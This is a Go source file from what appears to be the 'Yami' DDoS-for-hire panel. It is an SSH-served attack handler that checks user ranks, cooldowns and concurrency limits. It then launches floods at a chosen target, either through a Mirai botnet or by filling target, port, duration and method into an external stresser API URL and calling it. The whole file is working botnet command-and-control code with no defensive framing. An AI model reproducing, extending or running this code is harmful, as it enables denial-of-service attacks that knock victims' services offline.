package AttacksV2

import (
	JsonParse "Yami/core/models/Json"
	"Yami/core/clients/animations"
	Branding "Yami/core/clients/branding"
	YamiDB "Yami/core/db"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)


var (
	AttackDebug = false
	Spinners = false
)

type Method struct {

	// general infomation on the attack
	Method			string
	APIMethod			string
	DefaultPort		string

	// permissons
	AdminMethod		bool
	VIPMethod			bool

	// api link
	API				string

	LimitMaxTime bool
	LimitMax int
}

// Attack Version 2.0 Attack Handler!
func NewAttack(channel ssh.Channel, conn *ssh.ServerConn, Addr, Port, Time, Method string, DefaultPort bool) {
	
	// gets the users details from the database and checks for an error
	User, error := YamiDB.GetUser(conn.User()); if error != nil {

		if AttackDebug {
			log.Println(" [ATTACKDEBUG] User \""+User.Username+"\" has not been found")
		}

		if User.Admin {
			channel.Write([]byte("	Failed to get your account from database\r\n"))
			return
		}

		channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
		return
	} else if AttackDebug {
		log.Println(" [ATTACKDEBUG] User \""+User.Username+"\" has been found")
	}

	// checks if the user can send an attack with this method


	// checks if the target is already underattack by that person
	Struction, error := YamiDB.AlreadyUnderAttack(conn.User(), Addr); if error != nil {
		if AttackDebug {
			log.Println(" [ATTACKDEBUG] Failed to check Users recent attacks")
		}

		channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
		return
	} else if Struction != nil {
		lol,_ := strconv.ParseInt(strconv.Itoa(int(Struction.End)), 10, 64)
		TimeToWait := time.Unix(lol, 0)
		Branding.TermFXExecuteBannerCustomFour("already-underattack", conn, channel, "target", Struction.Target, "method", Struction.Method, "time", strconv.Itoa(Struction.Duration), "wait", fmt.Sprintf("%.0f", time.Until(TimeToWait).Seconds()))
		return
	}

	if !User.BypassBlacklist {
		Blacklist := CheckBlacklist(Addr); if Blacklist {
			channel.Write([]byte("	That target is blacklisted!\r\n"))
			return
		}
	}


	// gets the attack information from the "attack.json"
	CMethod, CMirai := Fetch(Method); if CMethod == nil && CMirai == nil {
		if AttackDebug {
			log.Println(" [ATTACKDEBUG] Method \""+Method+"\" doesnt exist")
		}
		channel.Write([]byte("	Method \""+Method+"\" doesnt exist!\r\n"))
		return
	} else if AttackDebug {
		log.Println(" [ATTACKDEBUG] Method has been found")
	}

	if CMethod != nil {
		if CMethod.AdminMethod && User.Admin {

			} else if CMethod.VIPMethod && User.Vip {
		
			} else if !CMethod.AdminMethod && !CMethod.VIPMethod {
				if CMethod.AdminMethod {
					Branding.TermFXExecuteBannerCustom("higher-rank-attack", conn, channel, "role", "admin")
					return
				} else if CMethod.VIPMethod {
					Branding.TermFXExecuteBannerCustom("higher-rank-attack", conn, channel, "role", "vip")
					return
				}
			}
	} else if CMirai != nil {
		if CMirai.Admin && User.Admin {

			} else if CMirai.Vip && User.Vip {
		
			} else if !CMirai.Admin && !CMirai.Vip {
				if CMirai.Admin {
					Branding.TermFXExecuteBannerCustom("higher-rank-attack", conn, channel, "role", "admin")
					return
				} else if CMirai.Vip {
					Branding.TermFXExecuteBannerCustom("higher-rank-attack", conn, channel, "role", "vip")
					return
				}
			}
	}
	if DefaultPort && CMirai == nil {
		if DefaultPort {
			if CMethod != nil {
				Port = CMethod.DefaultPort
			} else if CMirai != nil {
				Port = CMirai.DefaultPort
			}
		}
	}

	PortParsed, error := strconv.Atoi(Port); if error != nil {

		if CMethod != nil {
			Port = CMethod.DefaultPort
		} else if CMirai != nil {
			Port = CMirai.DefaultPort
		}
		DefaultPort = true
	}

	Duration, error := strconv.Atoi(Time); if error != nil {

		if AttackDebug {
			log.Println(" [ATTACKDEBUG] Attack time isnt an int!")
		}

		channel.Write([]byte("	Attack Time must be an int\r\n"))
		return
	}


	if User.MaxTime != 0 && Duration > User.MaxTime {

		if AttackDebug {
			log.Println(" [ATTACKDEBUG] Requested Attack time is over users allowed limit!")
		}
		Stringed, error := Branding.TermFXExecuteString(JsonParse.ConfigSyncs.Branding.OverAllowedTime, conn); if error != nil {
			channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
			return
		}
		channel.Write([]byte(Stringed))
		return
	} else if CMethod != nil {
		if CMethod.LimitMaxTime && CMethod.LimitMax < Duration {
			channel.Write([]byte("Your request is over the allowed use for that method!\r\n"))
			return
		}
	}

	Ammount, error := YamiDB.GetRunningUser(conn.User()); if error != nil {
		if AttackDebug {
			log.Println(" [ATTACKDEBUG] Failed to get running attack info")
		}

		channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
		return
	}

	MyRunning, err := YamiDB.MyAttacking(conn.User())
	if err != nil {
		channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
		return
	}

	if len(MyRunning) != 0 {

		if User.Concurrents <= Ammount {
			Stringed, error := Branding.TermFXExecuteString(JsonParse.ConfigSyncs.Branding.MaxConcurrentsReached, conn); if error != nil {
				channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
				return
			}
			channel.Write([]byte(Stringed))
			return
		}	

		var recent *YamiDB.Attack = MyRunning[0]

		for _, attack := range MyRunning {

			if attack.Created > recent.Created {
				recent = attack
				continue
			}
		}

		if recent.Created+int64(User.Cooldown) > time.Now().Unix() && User.Cooldown != 0 {
			TimeTesting := time.Unix(recent.Created+int64(User.Cooldown), 64)
			error := Branding.TermFXExecuteBannerCustom("cooldown-active", conn, channel, "untilcooldown", fmt.Sprintf("%.0f", time.Until(TimeTesting).Seconds()))
			if error != nil {
				channel.Write([]byte("you are currently in cooldown!"))
				return
			}

			return
		}
	}

	if User.Concurrents <= Ammount {
		if AttackDebug {
			log.Println(" [ATTACKDEBUG] User has reached max allowed running attacks")
		}
		Stringed, error := Branding.TermFXExecuteString(JsonParse.ConfigSyncs.Branding.MaxConcurrentsReached, conn); if error != nil {
			channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
			return
		}
		channel.Write([]byte(Stringed))
		return
	}

	if DefaultPort == true {
		if CMethod != nil {
			channel.Write([]byte("API Default Port Selected (:"+CMethod.DefaultPort+")\r\n"))
		} else if CMirai != nil {
			channel.Write([]byte("Mirai Default Port Selected (:"+CMirai.DefaultPort+")\r\n"))
		}


		if CMethod != nil {
			Port = CMethod.DefaultPort
		} else if CMirai != nil {
			Port = CMirai.DefaultPort
		}
	}

	Ports,_ := strconv.Atoi(Port)





	if CMethod == nil && CMirai != nil {
		error := Launch(Addr, Duration, Ports, CMirai); if error != nil {
			channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
			return
		} else {
			error = Branding.TermFXExecuteAttack("attack-sent", conn, channel, Addr, Port, Time, Method); if error != nil {
				channel.Write([]byte("\r	Attack has been requested through the Mirai\r\n"))
			} 

			var Attacking = YamiDB.Attack {
				Username: 		conn.User(),
				Target:             Addr,
				Method:             CMirai.Name,
				Type: "mirai",
				Port:               PortParsed,
				Duration:           Duration,
				Created:            time.Now().Unix(),
				End:                time.Now().Add(time.Duration(Duration) * time.Second).Unix(),
		
			}
		
			sent, error := YamiDB.LogAttack(&Attacking); if error != nil || !sent {
				if User.Admin {
					channel.Write([]byte(error.Error()))
				}
				channel.Write([]byte("\r	An error occurred while trying to attack this target\r\n"))
				return
			}
		}

		return
	}


	// API Launch!


	if len(CMethod.API) == 0 {
		channel.Write([]byte("	An error occurred while trying to attack this target\r\n"))
		return
	}

	attackURL := strings.Replace(CMethod.API, "<<$target>>", url.QueryEscape(Addr), -1)
	attackURL = strings.Replace(attackURL, "<<$port>>", url.QueryEscape(strconv.Itoa(PortParsed)), -1)
	attackURL = strings.Replace(attackURL, "<<$duration>>", url.QueryEscape(strconv.Itoa(Duration)), -1)
	attackURL = strings.Replace(attackURL, "<<$method>>", url.QueryEscape(CMethod.APIMethod), -1)
	if Spinners {
		go Animations.NewSpinner(channel)
	}



	client := http.Client{
		Timeout: time.Second * 80,
	}

	resp, error := client.Get(attackURL)
	if error != nil {
		log.Println("===== Failed To Launch Attack =====")
		log.Println("Method:", Method)
		log.Println("Target:",Addr)
		log.Println("URL:",attackURL)
		log.Println("Err:", error.Error())
	}

	Animations.Spinner = false

	time.Sleep(250 * time.Millisecond)


	if resp.StatusCode != 200 {
		log.Println("===== Failed To Launch Attack =====")
		log.Println("Method:", Method)
		log.Println("Target:",Addr)
		log.Println("URL:",attackURL)
		log.Println("Status:", resp.StatusCode)
		
		body, _ := ioutil.ReadAll(resp.Body)

		log.Println("Body:", string(body))

		channel.Write([]byte("\r	Failed to sent, Check Terminal Log!."))
		return
	}

	log.Println("========= SENT =========")
	log.Println("URL:", attackURL)


	Ports,_ = strconv.Atoi(strconv.Itoa(PortParsed))

	var Attacking = YamiDB.Attack {
		Username: 		conn.User(),
		Target:             Addr,
		Method:             Method,
		Type: "api",
		Port:               Ports,
		Duration:           Duration,
		Created:            time.Now().Unix(),
		End:                time.Now().Add(time.Duration(Duration) * time.Second).Unix(),

	}

	sent, error := YamiDB.LogAttack(&Attacking); if error != nil || !sent {
		if User.Admin {
			channel.Write([]byte(error.Error()))
		}
		channel.Write([]byte("\r	An error occurred while trying to attack this target\r\n"))
		return
	}

	error = Branding.TermFXExecuteAttack("attack-sent", conn, channel, Addr, Port, Time, Method); if error != nil {
		channel.Write([]byte("\r	Attack has been requested through the api\r\n"))
		return
	}

	return
}

var Spinner bool

func NewSpinner(channel ssh.Channel) {

	Spinner = true


	Frames := []string{
		"|", "/", "-", "\\", "|", "/", "-", "\\",
	}

	for _, I := range Frames {
		fmt.Fprint(channel, "\r"+I)

		if !Spinner {
			return
		}
	}

}